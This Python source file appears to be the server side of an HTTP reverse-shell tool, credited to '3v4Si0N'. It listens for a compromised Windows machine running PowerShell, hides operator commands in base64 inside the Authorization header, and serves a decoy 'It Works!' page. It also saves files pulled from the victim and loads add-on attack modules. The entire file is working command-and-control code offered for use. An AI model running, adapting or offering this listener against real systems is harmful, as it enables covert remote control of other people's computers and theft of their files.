#!/usr/bin/python3
import certificate, modulescontroller
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64, urllib.parse, time, readline, ssl, argparse, json
from termcolor import colored
from os import listdir, sep, path


global AUTOCOMPLETE
AUTOCOMPLETE = False

class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return

    def do_POST(self):
        self.send_response(200)
        html = "<html><body><h1>It Works!</h1></body></html>"

        result, parser_type, json_response, color = self.parseResult()
        pwd = self.getPwd(json_response)

        if (self.isDownloadFunctCalled(json_response)):
            filename, content, output = self.parseDownload(json_response)
            try:
                with open(filename, mode='wb') as file: # b is importante -> binary
                    content = base64.b64decode(content)
                    file.write(content)
                    print(colored(output, "green"))
            except:
                print (colored("\r\n[!] Error: Writing file!", "red"))
        else:
            if json_response["result"] != json_response["pwd"] and json_response["type"] != "4UT0C0MPL3T3":
                self.printResult(result, color)

        try:
            command = self.newCommand(pwd)
            self.sendCommand(command, html)
        except (AttributeError, BrokenPipeError) as e:
            pass
        return

    def parseResult(self):
        test_data = self.rfile.read(int(self.headers['Content-Length']))
        data = json.loads(test_data.decode('utf-8'))
        parser_type = data["type"]
        result = ""
        color = "white"
        global PSH_FUNCTIONS

        if parser_type != "newclient":
            try:
                if (parser_type == "C0MM4ND"):
                    color = "white"
                elif (parser_type == "3RR0R"):
                    color = "red"
                else:
                    color = "green"

                if (parser_type == "4UT0C0MPL3T3"):
                    PSH_FUNCTIONS = (base64.b64decode(data["result"])).decode('utf-8').split()
                    readline.set_completer(self.completer)
                    readline.set_completer_delims(" ")
                    readline.parse_and_bind("tab: complete")

                else:
                    result = urllib.parse.unquote(data["result"])
                    result = (base64.b64decode(data["result"])).decode('utf-8')
            except:
                pass
        else:
            input(colored("[!] New Connection, please press ENTER!",'red'))


        return result, parser_type, data, color

    def parseDownload(self, json_result):
        downloaded_file_path = ""
        output = ""
        file_content = ""

        try:
            output = json_result["result"]
            downloaded_file_path = json_result["pathDst"]
            file_content = json_result["file"]
        except KeyError:
            pass

        return downloaded_file_path, file_content, output

    def getPwd(self, json_response):
        try:
            if json_response["pwd"]:
                pwd_decoded = base64.b64decode(json_response["pwd"].encode())
                pwd = pwd_decoded.decode('utf-8').strip()
        except KeyError:
            pwd_decoded = base64.b64decode(json_response["result"].encode())
            pwd = pwd_decoded.decode('utf-8').strip()
        return pwd

    def printResult(self, result, color):
        print(colored(result, color))

    def isDownloadFunctCalled(self, json_response):
        iscalled = False
        try:
            if (json_response["type"] == "D0WNL04D" and json_response["file"]):
                iscalled = True
        except KeyError:
            pass
        return iscalled

    def newCommand(self, pwd):
        global AUTOCOMPLETE
        if AUTOCOMPLETE:
            command = "autocomplete"
            AUTOCOMPLETE = False
        elif pwd != "":
            #readline.parse_and_bind("tab: complete")
            command = input(colored("PS {}> ".format(pwd), "blue"))
            if command == "":
                command = "pwd | Format-Table -HideTableHeaders"
        else:
            command = "pwd | Format-Table -HideTableHeaders"
        return command

    def sendCommand(self, command, html, content=""):
        if (command != ""):
            command_list = command.split(" ")
            if command_list[0] in MODULES.keys():
                html = modulescontroller.ModulesController(MODULES,command_list, command)
                html = str(html)

            CMD = base64.b64encode(command.encode())
            self.send_header('Authorization',CMD.decode('utf-8'))
            self.end_headers()
            self.wfile.write(html.encode())
            
    def completer(self,text, state):
        options = [i for i in PSH_FUNCTIONS if i.startswith(text)]
        if state < len(options):
            return options[state]
        else:
            return None



def loadModules():
    res = {}
    # check subfolders
    lst = listdir("modules")
    dir = []
    for d in lst:
        s = path.abspath("modules") + sep + d
        if path.isdir(s) == False:
            dir.append(d.split(".")[0])
    # load the modules
    for d in dir:
        res[d] = __import__("modules." + d, fromlist = ["*"])
    return res

def main():

    banner = """
██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                         By: 3v4Si0N
    """
    print (colored(banner, 'yellow'))
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('host', help='Listen Host', type=str)
    parser.add_argument('port', help='Listen Port', type=int)
    parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
    parser.add_argument('--autocomplete', default=False, action="store_true", help='Autocomplete powershell functions')
    args = parser.parse_args()

    try:
        HOST = args.host
        PORT = args.port
        global AUTOCOMPLETE
        global MODULES
        server = HTTPServer((HOST, PORT), myHandler)
        print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))
        MODULES = loadModules()

        if (args.ssl):
            cert = certificate.Certificate()
            if ((cert.checkCertPath() == False) or cert.checkCertificateExpiration()):
                cert.genCertificate()
            server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)

        if (args.autocomplete):
            AUTOCOMPLETE = True
        else:
            readline.set_completer_delims(" ")
            readline.parse_and_bind("tab: complete")

        server.serve_forever()

    except KeyboardInterrupt:
        print (' received, shutting down the web server')
        server.socket.close()

main()
